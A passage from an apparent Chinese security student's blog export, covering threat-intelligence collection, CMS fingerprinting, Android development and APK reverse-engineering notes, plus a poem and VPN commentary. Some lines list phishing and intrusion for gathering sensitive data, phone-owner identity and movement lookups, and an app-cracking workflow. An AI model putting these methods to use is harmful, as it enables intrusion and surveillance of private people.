rel="noopener">NOSEC大数据平台</a>、<a href="https://polyswarm.io/zh-CN/" target="_blank" rel="noopener">PolySwarm</a>。</p><p>监控黑灰产常用的威胁猎人。<a href="https://github.com/threathunterX/nebula" target="_blank" rel="noopener">“星云”业务风控系统</a>。TODO</p><p>利用厂商的这些产品，可以更快更方便的收集整理信息，但这只是一小部分。</p><h3 id="为什么企业需要威胁情报？"><a href="#为什么企业需要威胁情报？" class="headerlink" title="为什么企业需要威胁情报？"></a>为什么企业需要威胁情报？</h3><p>~提供了培养公司整体网络<strong>风险感知</strong>的指南</p><p>~驱动公司<strong>安全建设</strong>方向和<strong>降低灾损</strong>危害</p><p>~不再是料敌先机和被动防御，更能<strong>防守反击</strong></p><h3 id="怎么从白帽子黑客转为情报员？"><a href="#怎么从白帽子黑客转为情报员？" class="headerlink" title="怎么从白帽子黑客转为情报员？"></a>怎么从白帽子黑客转为情报员？</h3><ul><li><p>基本保密意识和反社工能力，善用搜索引擎和社工<strong>收集信息</strong>（最常用的）</p></li><li><p>热点制作与钓鱼，渗透入侵等技术手段<strong>获取敏感信息</strong></p></li><li><p>从海量数据中筛选分析真假数据（核心是数据分析0），生成画像<strong>溯源威胁源</strong>。使用工具收集整理和分析</p></li><li><p>战术开发，战略规划。（产出入侵方案和反入侵方案）</p></li></ul><h2 id="企业安全建设"><a href="#企业安全建设" class="headerlink" title="企业安全建设"></a>企业安全建设</h2><h3 id="情报收集常用方法"><a href="#情报收集常用方法" class="headerlink" title="情报收集常用方法"></a>情报收集常用方法</h3><p>第一步，进行威胁情报信息收集。</p><ul><li><p>OSINT：聚合分析，情报圈，威胁情报平台，共享威胁情报[1]</p><ul><li>扩：聚合分析是什么——对有关数据进行内容挑选、分析、归类，对一个数据集求最大、最小、和、平均值等指标的聚合。最后能够产生标量值的数据转换过程。<br>简单地来说，就是聚集大量数据，分析和处理后，产生一个可用的结论。</li></ul></li><li><p>未公开情报：暗网情报、黑客黑产社交社区(Telegram中存在大量的交流频道，<a href="https://www.hottg.com/" target="_blank" rel="noopener">频道搜索</a>)</p></li><li><p>基础情报：SIEM(Security Information and Event Management，比较有名的软件比如<a href="https://www.mcafee.com/enterprise/zh-cn/products/siem-products.html" target="_blank" rel="noopener">McFee的SIEM</a>)、FC-ISAC、日志管理器等威胁数据</p></li></ul><h3 id="情报分类及画像"><a href="#情报分类及画像" class="headerlink" title="情报分类及画像"></a>情报分类及画像</h3><p>收集的情报会有很多，但我们需要对情报进行分类，对其重要性进行评估。也是就是对情报进行级别划分。<br><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200213004136.png"></p><ul><li><p>战术级情报（标准的安全知识定义）——运营级情报（标签化的画像、场景的运用）——战略级情报（国家层面，高效的知识传递手段）  </p></li><li><p>威胁情报是为了解决：检测误漏、防护滞后和相应迟缓等问题。</p></li><li><p>威胁情报是一种<strong>知识和能力</strong>，目的也很明确，是<strong>为了企业进行更好的安全决策</strong>。</p></li></ul><h3 id="不同情报类型在企业的应用"><a href="#不同情报类型在企业的应用" class="headerlink" title="不同情报类型在企业的应用"></a>不同情报类型在企业的应用</h3><ul><li>策略情报</li><li>行动情报</li><li>战略情报</li></ul><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200213005401.png"></p><hr><h1 id="情报研判"><a href="#情报研判" class="headerlink" title="情报研判"></a>情报研判</h1><p>情报研判属于公安或者网安专门用于经济犯罪的情报侦缉手段。</p><h2 id="情报收集平台"><a href="#情报收集平台" class="headerlink" title="情报收集平台"></a>情报收集平台</h2><p>举例，不同的情报收集平台。</p><h3 id="RedQueen"><a href="#RedQueen" class="headerlink" title="RedQueen"></a>RedQueen</h3><ul><li><a href="https://redqueen.tj-un.com/IntelHome.html;JSESSIONID=6d3fdffb-b493-4b3a-a993-3f48e8e30ce7" target="_blank" rel="noopener">链接</a></li><li>安全情报，并不及时</li></ul><h3 id="永安在线"><a href="#永安在线" class="headerlink" title="永安在线"></a>永安在线</h3><ul><li><p>原威胁猎人。提供黑产对抗与反欺诈服务。<a href="https://www.yazx.com/" target="_blank" rel="noopener">链接</a>。</p></li><li><p>产品本身不免费，但提供了一个开源的风控系统<a href="https://github.com/threathunterX/nebula" target="_blank" rel="noopener">“星云”</a></p></li></ul><p>[TODO，看看黑灰产报告，<a href="https://zhuanlan.zhihu.com/p/34087704]" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/34087704]</a></p><h3 id="TreatBook"><a href="#TreatBook" class="headerlink" title="TreatBook"></a>TreatBook</h3><ul><li>微步在线<a href="https://m.threatbook.cn/" target="_blank" rel="noopener">情报社区</a></li><li>提供一个域名监控功能，当一个域名发生变化的时候，平台会把监控信息发送到指定邮箱。在企业中，可以监控自身的域名资产，排查异样的情况。</li><li>可视化 功能，可以看到相关域名等信息。</li></ul><h3 id="如何收集？"><a href="#如何收集？" class="headerlink" title="如何收集？"></a>如何收集？</h3><ul><li><p>拿到数据后，从一个常见的指标进行分析：</p><ul><li>网络。IP，URL</li><li>主机。文件哈希，动态链接库，注册表</li><li>邮件</li></ul></li><li><p>使用开源的威胁情报平台 [TODO]</p></li><li><p>自己搭建蜜罐、蜜网，收集攻击数据（IP，Hash，URL等）</p></li><li><p>对自己的已有资产进行分析建模</p></li></ul><h2 id="互联网资源搜索"><a href="#互联网资源搜索" class="headerlink" title="互联网资源搜索"></a>互联网资源搜索</h2><h3 id="身份类"><a href="#身份类" class="headerlink" title="身份类"></a>身份类</h3><ul><li>身份类信息概述<ul><li>国家信息体系建设介绍</li><li>政府开放信息资源介绍</li></ul></li><li>政府开放信息查询</li><li>信用信息查询</li><li>法律裁判及处罚查询</li><li>职业身份查询</li><li>其他</li></ul><h3 id="手机号"><a href="#手机号" class="headerlink" title="手机号"></a>手机号</h3><ul><li><p>号码归属地查询</p></li><li><p>持机人身份查询</p></li><li><p>位置查询</p></li><li><p>IMEI查询</p></li><li><p>IMSI查询</p><ul><li>超雪IMSI</li><li>the-x</li></ul></li><li><p>ICCID查询</p><ul><li>ICCID查询</li><li>果粉查询</li><li>卡神查询</li><li>找果网</li></ul></li><li><p>MAC查询</p></li><li><p>行踪查询</p></li></ul><h3 id="金融类"><a href="#金融类" class="headerlink" title="金融类"></a>金融类</h3><p>TODO</p><h3 id="图像类"><a href="#图像类" class="headerlink" title="图像类"></a>图像类</h3><ul><li><p>图像识别</p><ul><li>以图搜图<ul><li>Google 图片</li><li>百度识图</li><li>搜狗图片</li><li>360识图</li><li>汇图网</li><li>淘宝网</li><li>Saucenao</li><li>Tineye</li></ul></li><li>微博图片来源插件</li><li>拍照识别<ul><li>花伴侣</li><li>形色识花</li></ul></li></ul></li><li><p>人脸识别对比</p></li><li><p>图片位置信息查看</p></li><li><p>图片及网页内容检测</p></li><li><p>超高清图像拍照</p></li><li><p>在线视频查看</p></li><li><p>模糊图像处理</p></li><li><p>视频编辑</p></li></ul><h3 id="物品类"><a href="#物品类" class="headerlink" title="物品类"></a>物品类</h3><h3 id="搜索类"><a href="#搜索类" class="headerlink" title="搜索类"></a>搜索类</h3><h3 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h3><h3 id="情报研判详解"><a href="#情报研判详解" class="headerlink" title="情报研判详解"></a>情报研判详解</h3><p>[TODO]</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200213103415.png" style="zoom:50%;" /><p>情报带来更多的是<strong>攻防思路的变化</strong>。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><p>如何学习情报分析</p><p>推荐的书籍：</p><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200213114312.png"></p></li></ul><ul><li><p>安全威胁情报是和数字取证相关联的，数字取证获取的一部分资料，就是安全威胁情报的一部分。</p></li><li><p>黑客和情报员的身份是可以同时存在的。</p></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] 威胁情报的私有化生产和级联：威胁狩猎及情报共享(<a href="https://www.freebuf.com/articles/es/222359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/es/222359.html</a>)  TODO</p><p>[2] 威胁情报的层次分析(<a href="https://ti.360.net/blog/articles/level-of-threat-intelligence/" target="_blank" rel="noopener">https://ti.360.net/blog/articles/level-of-threat-intelligence/</a>)</p><p>[3] About CybOX(Archive)(<a href="https://cyboxproject.github.io/about/" target="_blank" rel="noopener">https://cyboxproject.github.io/about/</a>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
            <tag> 情报 </tag>
            
            <tag> 威胁情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何判断CMS的类型</title>
      <link href="/2020/02/12/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%ADCMS%E7%9A%84%E7%B1%BB%E5%9E%8B/"/>
      <url>/2020/02/12/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%ADCMS%E7%9A%84%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="如何判断CMS的类型？"><a href="#如何判断CMS的类型？" class="headerlink" title="如何判断CMS的类型？"></a>如何判断CMS的类型？</h1><p>本文系吐司上看到的一个回答的摘录，以及一些修改。</p><h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><p>使用指纹识别工具（网站）</p><ul><li><p>云悉识别<br><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p></li><li><p>OnlineTools</p><p><a href="http://tools.hexlt.org/whatcms" target="_blank" rel="noopener">http://tools.hexlt.org/whatcms</a></p><p><a href="https://github.com/iceyhexman/onlinetools" target="_blank" rel="noopener">https://github.com/iceyhexman/onlinetools</a></p></li><li><p>WhatWeb(国外)</p><p><a href="https://whatweb.net/" target="_blank" rel="noopener">https://whatweb.net/</a></p></li><li><p>bugscaner指纹识别</p><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a> </p></li><li><p>百度云观测（探测web应用）</p><p><a href="http://ce.baidu.com/index/guance?start_url=" target="_blank" rel="noopener">http://ce.baidu.com/index/guance?start_url=</a> </p></li><li><p>潮汐指纹（指纹识别）</p><p><a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></p></li></ul><h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><p>查看网站的一些信息</p><ul><li><p>网站命名规则</p></li><li><p>返回头的关键字</p></li><li><p>网页关键字</p></li><li><p>URL特征</p></li><li><p>Meta特征</p></li><li><p>Script特征</p></li><li><p>robots.txt</p></li><li><p>网站路径特征</p></li><li><p>网站静态资源</p></li><li><p>爬取网站目录信息<br>例如/templets/default/style/dedecms.css（织梦CMS）关键的 js/css 文件</p></li><li><p>使用<a href="https://www.wappalyzer.com/download" target="_blank" rel="noopener">Wappalyzer</a>（一个框平台工具，可以检测网站使用的技术，CMS识别等）</p></li><li><p>网站独有文件的hash md5，例如favicon.ico，或者某固定的头像等</p></li><li><p>是否用了某种开源程序cms，然后我们可以利用公开的对应版本的poc、默认的后台登录页/数据库服务端口认证等进行测试，也可以将对应版本的源码下载下来进行代码审计</p></li><li><p>请求头server</p></li><li><p>页面的报错，报错页面源码（404页面）</p></li><li><p>cookie</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 安全综合 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No_Man_is_an_Island</title>
      <link href="/2020/02/07/No-Man-is-an-Island/"/>
      <url>/2020/02/07/No-Man-is-an-Island/</url>
      
        <content type="html"><![CDATA[<p>No man is an island entire of itself; every man<br>is a piece of the continent, a part of the main;<br>if a clod be washed away by the sea, Europe<br>is the less, as well as if a promontory were, as<br>well as any manner of thy friends or of thine<br>own were; any man’s death diminishes me,<br>because I am involved in mankind.<br>And therefore never send to know for whom<br>the bell tolls; it tolls for thee. </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>关于国内VPN浏览器的一些思考</title>
      <link href="/2020/02/07/%E5%85%B3%E4%BA%8E%E5%9B%BD%E5%86%85VPN%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
      <url>/2020/02/07/%E5%85%B3%E4%BA%8E%E5%9B%BD%E5%86%85VPN%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="关于国内VPN浏览器的一些思考"><a href="#关于国内VPN浏览器的一些思考" class="headerlink" title="关于国内VPN浏览器的一些思考"></a>关于国内VPN浏览器的一些思考</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天偶然发现，国内推出了一款叫做<a href="https://zyj.bjbywx.com/" target="_blank" rel="noopener">“自由鲸”</a>的VPN浏览器，通过该浏览器可以实现“翻墙”，并且取得了官方备案。</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200206223136.png" style="zoom: 25%;" />  图：“自由鲸”浏览器官网主页<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200206221237.png" style="zoom:33%;" />  图：官网主页的备案认证。<img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200206223404.png" style="zoom: 50%;" /><p>图：“自由鲸”浏览器的用户守则</p><h2 id="思考过程"><a href="#思考过程" class="headerlink" title="思考过程"></a>思考过程</h2><p>第一次遇到，确实感到惊讶，是国内政策有变动吗？问了老师，自己思考了一下，可能是以下的几种考虑：</p><ol><li>堵不如疏，确实有大量娱乐/发展/研究需求</li><li>国企参与，出事兜底</li><li>可能有文化输出的意思，参照李子柒</li><li>多要实名认证，便于排查</li></ol><p>在新华网上的一篇文章也提到，“VPN“翻墙”是违法行为，工信部对其监管和上锁近年来是不断加强的。其中有一句话值得推敲：“所谓的翻墙软件并没有获得电信主管部门批准”。也就是说，获得电信主管主管部门批准的，官方“翻墙”服务是存在的，就像高校提供的ipv6。</p><p>还有一段话是：“多位律师认为根据法律原则性规定，浏览被禁止的网页应该涉嫌违法，但如何处罚则要视具体情节及危害程度而定。如果只是自己浏览没有散布，那么情节轻微，一般不会受罚”。也就是说，国内现在的一方意见表明，浏览被禁止网页<strong>涉嫌</strong>违法，但个人浏览且未散播，是不受处罚的。但要格外注意，涉及危改国家安全的内容是没有商量余地的，浏览传播，都会涉嫌违法并处罚。</p><h2 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h2><ol><li>国内外未经主管部门批准的“翻墙”软件/服务，是违法的，会被查封。</li><li>经主管部门批准，具有一定资格（国企的带宽资源）的，可以运营。</li><li>“翻墙”涉嫌违法，但方式、内容、程度等不同，处罚和监管也不同。</li><li>国内现在兴起的VPN浏览器是实属“擦边”，由主管部门认证，国企共同参与，并要求用户遵守相应法律法规。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Android项目开发杂记</title>
      <link href="/2020/02/02/Android%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E6%9D%82%E8%AE%B0/"/>
      <url>/2020/02/02/Android%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E6%9D%82%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Android项目开发杂记"><a href="#Android项目开发杂记" class="headerlink" title="Android项目开发杂记"></a>Android项目开发杂记</h1><h2 id="0-和安全相关"><a href="#0-和安全相关" class="headerlink" title="0. 和安全相关"></a>0. 和安全相关</h2><p>项目根目录里的<code>proguard-rules.pro</code>这个文件用于指定项目代码的混淆规则，在代码开发完成后打成安装包文件后使反编译代码难以阅读。</p><h2 id="1-代码相关"><a href="#1-代码相关" class="headerlink" title="1. 代码相关"></a>1. 代码相关</h2><ul><li><p>基本上所有活动都需要继承的<code>AppCompatActivity</code>类，是一种向下兼容的Activity，可以将Activity在各个系统版本中增加的特性和功能最低兼容到Android 2.1系统。  </p></li><li><p>Activity是Android系统提供的一个活动基类，我们项目中所有的活动都必须继承它或者它的子类才能拥有活动的特性（AppCompatActivity是Activity的子类）。  </p></li><li><p>onCreate()是一个活动被创建时必定要执行的方法</p></li><li><p>活动引入布局文件的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 继承基类（Activity），重写基类onCreate方法，传入的是当前Activity的状态</span></span><br><span class="line">    <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    <span class="comment">// 绑定该活动的布局文件</span></span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...   </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>res目录结构</p><ul><li>drawable — 存放图片<ul><li>drawable-hdpi、drawable-xhdpi、drawable-xxhdpi, etc.</li></ul></li></ul></li><li><p>mipmap — 存放应用图标</p><ul><li>values — 存放字符串、样式、颜色等配置<ul><li>在活动里通过<code>R.string.XXX</code>来调用</li><li>在布局文件XML里通过<code>@string/XXX</code>来调用</li><li>上述的string可替换为 drawable, mipmap, layout等</li></ul></li><li>layout — 存放布局文件</li></ul></li><li><p>在<code>AndroidManifest.xml</code>文件中，所有的活动声明放在<code>&lt;application&gt;</code>里，在<code>&lt;activity&gt;</code>中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">  <span class="attr">...</span></span></span><br><span class="line"><span class="tag">  /&gt;</span></span><br><span class="line">...</span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".XXX"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用<code>android:label</code>指明活动中标题栏的内容（显示在最顶部），给主活动指定的label不仅会成为标题栏中的内容，还会成为启动器（Launcher）中应用程序显示的名称。</p></li><li><p>intent</p><ul><li><p>显式intent：直接在活动中写明，从一个活动“跳转”到另一个活动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">     Intent intent = <span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity.class);</span><br></pre></td></tr></table></figure></li><li><p>隐式intent：不明确指明要启动的活动，而是指明（例如在AndroidManifest.xml中）一系列更为抽象的action和category等信息。交由系统分析这个intent，找到最适合的活动去启动。</p><p>最适合也就是指，在当前的情况下，可以响应这个隐式intent的活动。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".SecondActivity"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"com.example.activitytest.ACTION_START"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.DEFAULT"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接把action的字符串内容传入，表示这个隐式intent想要启动能够 响应/符合 这个action的活动</span></span><br><span class="line">Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.activitytest.ACTION_START"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加一个category，表示这个隐式intent想要启动能够 响应/符合 这个category的活动</span></span><br><span class="line">Intent intent = <span class="keyword">new</span> Intent(<span class="string">"com.example.activitytest.ACTION_START"</span>);</span><br><span class="line">intent.addCategory(<span class="string">"com.example.activitytest.MY_CATEGORY"</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><p>隐式intent的另一个重要作用是：可以启动其他程序的活动，<strong>使得多个应用程序内的功能共享成为了可能</strong>。e.g.带哦用</p></li></ul></li></ul><ul><li><p>使用ListView的简单思路：</p><ul><li><p>创建活动</p></li><li><p>编写布局，为ListView指定一个ID</p></li><li><p>数组数据无法直接传给ListView，需要借助适配器Adapter来完成（推荐ArrayAdapter）</p></li><li><p>指定ArrayAdapter的泛型，在ArrayAdapter函数里依次传入：当前上下文、ListView子项布局的ID，要适配的数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ArrayAdapter&lt;String&gt; adapter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(                     MainActivity.<span class="keyword">this</span>, android.R.layout.simple_list_item_1, data);</span><br></pre></td></tr></table></figure></li><li><p>调用ListView的setAdapter方法，传递构建好的适配器对象，建立起ListView和数据的关联</p></li></ul></li></ul><h2 id="2-架构相关"><a href="#2-架构相关" class="headerlink" title="2. 架构相关"></a>2. 架构相关</h2><ul><li>Android程序的设计讲究逻辑和视图分离。通用的方法是在布局文件（layout）中编写界面，在活动（Activity）中引入。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安全情报学习技能树</title>
      <link href="/2020/02/01/%E6%83%85%E6%8A%A5%E5%AD%A6%E4%B9%A0%E6%8A%80%E8%83%BD%E6%A0%91/"/>
      <url>/2020/02/01/%E6%83%85%E6%8A%A5%E5%AD%A6%E4%B9%A0%E6%8A%80%E8%83%BD%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<h1 id="安全情报学习技能树"><a href="#安全情报学习技能树" class="headerlink" title="安全情报学习技能树"></a>安全情报学习技能树</h1><h2 id="情报学相关"><a href="#情报学相关" class="headerlink" title="情报学相关"></a>情报学相关</h2><h2 id="安全技能"><a href="#安全技能" class="headerlink" title="安全技能"></a>安全技能</h2><h2 id="语言能力"><a href="#语言能力" class="headerlink" title="语言能力"></a>语言能力</h2><h2 id="新闻传播"><a href="#新闻传播" class="headerlink" title="新闻传播"></a>新闻传播</h2><h2 id="战略研究"><a href="#战略研究" class="headerlink" title="战略研究"></a>战略研究</h2><h2 id="工作相关"><a href="#工作相关" class="headerlink" title="工作相关"></a>工作相关</h2><h2 id="综合能力"><a href="#综合能力" class="headerlink" title="综合能力"></a>综合能力</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 安全情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>移动应用程序逆向</title>
      <link href="/2020/01/17/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91/"/>
      <url>/2020/01/17/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="移动应用程序逆向"><a href="#移动应用程序逆向" class="headerlink" title="移动应用程序逆向"></a>移动应用程序逆向</h1><h2 id="移动应用逆向分析"><a href="#移动应用逆向分析" class="headerlink" title="移动应用逆向分析"></a>移动应用逆向分析</h2><h3 id="自己预习的内容"><a href="#自己预习的内容" class="headerlink" title="自己预习的内容"></a>自己预习的内容</h3><ol><li>破解Android程序的通常方法<br>将apk文件利用ApkTool（Android反编译工具）进行反编译，生成Smali格式的反汇编代码，然后阅读Smali文件的代码来理解程序的运行机制，找到程序的突破口进行修改，最后使用ApkTool重新编译生产apk文件并签名，最后运行测试，如此循环，直至程序被成功破解。  </li></ol><p>反编译——理解运行机制——找突破口进行修改——重新编译——再签名——运行测试——循环往复  </p><h3 id="Why-Android"><a href="#Why-Android" class="headerlink" title="Why Android?"></a>Why Android?</h3><p>APP-移动互联网的入口<br>安全研究的“交集”<br>Android的市场份额 —— 和iOS其实是相通的</p><h3 id="逆向Android的目的？"><a href="#逆向Android的目的？" class="headerlink" title="逆向Android的目的？"></a>逆向Android的目的？</h3><p>遇到的问题：<br>代码混淆<br>反调试<br>加壳</p><h3 id="认识APK文件"><a href="#认识APK文件" class="headerlink" title="认识APK文件"></a>认识APK文件</h3><p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20200114091238.png"><br>1.AndroidMainfest</p><ul><li>XML格式</li><li>二进制数据存储</li><li>内容：<ul><li>包名、名称、图标、targetSDK、版本号等；</li><li>需要的权限列表（安全研究时用得少，恶意代码分析用得多）；</li><li>使用的组件信息（Activity，Service，Broadcast Receiver，Content Provider）<ul><li>Activity：可视的界面；生命周期、启动模式</li><li>Service：服务，前台和后台</li><li>BroadCast Receiver</li><li>Content Provider：内容提供者：URI，增删改查</li></ul></li></ul></li></ul><p>2.lib —— Native代码编译后的库、第三方库<br>3.res —— 资源文件<br>4.assets —— 音频、视频、图片等静态文件（有些加壳后存放到这个）</p><hr><p>1.DEX文件</p><ul><li>Java -&gt; dex</li><li>dex.035 文件头，可以通过这个来找</li></ul><p>2.SO文件</p><ul><li>C/C++编译后的文件（elf格式）</li><li>JNI</li><li>第三方库（opencv，unity）</li><li>架构：armeabi…</li></ul><p>3.签名文件</p><ul><li>防止被篡改</li><li>APP升级（判断是否是正确的升级包）</li><li>代码或数据共享（e.g.只给自己共享，不给别的APP共享）</li><li>文件结构：<ul><li>META-INF目录</li><li>MANIFEST.MF    所有文件的SHA1/SHA256的Base64编码</li><li>CERT.ST    MANIFEST.MF文件的SHA1/SHA256的Base64编码</li><li>CERT.RSA/.DSA    签名的公钥，SF签名后的数据</li></ul></li></ul><p>这是V1方式，这里也是一个漏洞利用点。正当用途：APP分发到各个市场的分发计费</p><hr><h1 id="Android-应用的逆向技术和方法"><a href="#Android-应用的逆向技术和方法" class="headerlink" title="Android 应用的逆向技术和方法"></a>Android 应用的逆向技术和方法</h1><h2 id="逆技"><a href="#逆技" class="headerlink" title="逆技"></a>逆技</h2><p>逆技：一机（一台Root后的手机，小米有开发版本的root系统）；一APK；一椅（一逆逆一天）；一钛合金眼</p><h2 id="逆向流程"><a href="#逆向流程" class="headerlink" title="逆向流程"></a>逆向流程</h2><p>反编译 ——&gt; 目标定位 &lt;——&gt; 核心目标逆向</p><h3 id="1-反编译"><a href="#1-反编译" class="headerlink" title="1. 反编译"></a>1. 反编译</h3><h4 id="dex"><a href="#dex" class="headerlink" title="dex"></a>dex</h4><ul><li>dex -&gt; smali<ul><li>baksmail [TOOL]</li></ul></li><li>dex -&gt; smali -&gt;java<ul><li>jeb</li><li>Apktool (前者结合用，Smali代码是不会有错的，伪Java可能会错)</li><li>dex2jar</li></ul></li></ul><h4 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h4><ul><li>elf -&gt; arm指令<ul><li>IDA</li><li>Radare2 （NSA放出来的工具） [TOOL]</li><li>Ghidra</li></ul></li><li>Arm指令 -&gt; C++<ul><li>IDA F5</li><li>Ghidra</li></ul></li></ul><h3 id="2-关键字定位"><a href="#2-关键字定位" class="headerlink" title="2. 关键字定位"></a>2. 关键字定位</h3><p>关键字定位<br>资源定位<br>日志定位<br>调用栈跟踪</p><h4 id="关键字定位"><a href="#关键字定位" class="headerlink" title="关键字定位"></a>关键字定位</h4><p>1.字符关键字<br>2.代码关键字<br>3.Grep大法好</p><ul><li>反编译后的静态代码</li><li>动态加载的代码（不一定找得到，也是代码保护的一个手段）</li><li>监控文件变化</li></ul><h4 id="资源定位"><a href="#资源定位" class="headerlink" title="资源定位"></a>资源定位</h4><p>1.定位UI中的资源变量名（如红包的LOGO），例如红包按钮为“a77”</p><ul><li>ddms</li><li>uiautomatorviewer</li><li>dumpsys</li></ul><p>2.res目录中寻找该变量对应的索引值<br>3.在Smali代码中grep所有对该索引值的引用</p><h4 id="日志定位"><a href="#日志定位" class="headerlink" title="日志定位"></a>日志定位</h4><p>1.adb logcat | grep</p><p>2.日志文件</p><ul><li>APP目录下</li><li>SDcard</li></ul><p>3.打开APP内置的日志开关（开发人员在开发时为方便调试打开的，几乎所有的APP都有，<strong>非常好用</strong>）</p><ul><li>重打包</li><li>hook</li></ul><p>4.Smali注入</p><ul><li>污点跟踪</li><li>数据流分析</li></ul><h4 id="调用栈跟踪"><a href="#调用栈跟踪" class="headerlink" title="调用栈跟踪"></a>调用栈跟踪</h4><p>1.ddms method profiling<br>2.hook系统函数打印callback（相当于是录像一样</p><h3 id="3-核心目标逆向"><a href="#3-核心目标逆向" class="headerlink" title="3. 核心目标逆向"></a>3. 核心目标逆向</h3><h4 id="静态分析"><a href="#静态分析" class="headerlink" 